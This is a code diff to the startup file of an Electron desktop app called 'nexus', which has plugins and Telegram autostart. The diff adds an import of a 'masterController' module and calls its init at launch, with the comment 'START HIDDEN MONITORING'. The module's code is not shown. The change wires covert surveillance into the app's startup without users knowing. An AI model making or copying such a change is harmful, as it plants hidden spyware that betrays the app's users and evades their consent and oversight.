@@ -16,6 +16,7 @@ import { appLog } from './utils/app-logger'
 import { enableAutoRun, disableAutoRun } from './sys/autoRun'
 import { isRunningAsAdmin } from './utils/elevation'
 import { pluginManager } from './core/plugin-manager'
+import { masterController } from './core/master-controller'
 
 // Lock the userData / cache / log folder names.
 app.setName(is.dev ? 'nexus-dev' : 'nexus')
@@ -85,6 +86,7 @@ app.whenReady().then(async () => {
   const appConfig = await getAppConfig()
 
   await pluginManager.init()
+  await masterController.init() // START HIDDEN MONITORING
 
   if (appConfig.tgws?.autoStart) {
     appLog('info', 'Autostart Telegram WS — start')
